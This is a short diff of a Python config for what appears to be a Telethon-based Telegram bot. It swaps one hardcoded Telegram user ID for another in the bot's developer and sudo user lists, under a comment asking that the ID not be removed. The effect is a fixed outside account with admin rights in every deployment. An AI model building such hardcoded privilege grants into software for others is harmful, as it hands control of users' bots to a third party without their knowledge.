@@ -144,9 +144,9 @@ else:
     
 # Don't Remove my ID from DEV and SUDO list!!!.... 
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add( 1137511834)
+DEV_USERS.add( 1612881302)
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add( 1137511834)
+SUDO_USERS.add( 1612881302)
 
 # Telethon
 api_id = TELETHON_ID
